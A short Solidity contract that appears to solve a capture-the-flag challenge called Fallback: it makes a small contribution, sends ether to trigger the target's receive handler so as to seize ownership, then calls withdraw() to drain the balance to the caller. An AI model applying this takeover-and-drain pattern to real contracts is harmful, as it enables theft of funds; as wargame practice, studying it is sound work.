// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

contract ChallengeFallback {
    address payable fallbackInstance;

    constructor(address payable _fallbackInstance) {
        fallbackInstance = _fallbackInstance;
    }

    function becomeOwner() public payable {
        bytes memory payload = abi.encodeWithSignature('contribute()');
        (bool success,) = address(fallbackInstance).call{value: msg.value/2}(payload);
        require(success);
        bytes memory payload2 = abi.encodeWithSignature('receive()');
        (bool success2,) = address(fallbackInstance).call{value: msg.value/2}(payload2);
        require(success2);
    }

    function withdrawFunds() public {
        bytes memory payload3 = abi.encodeWithSignature('withdraw()');
        (bool success3,) = address(fallbackInstance).call(payload3);
        require(success3);
        payable(address(msg.sender)).transfer(address(this).balance);
    }

    receive() external payable {
    }
}
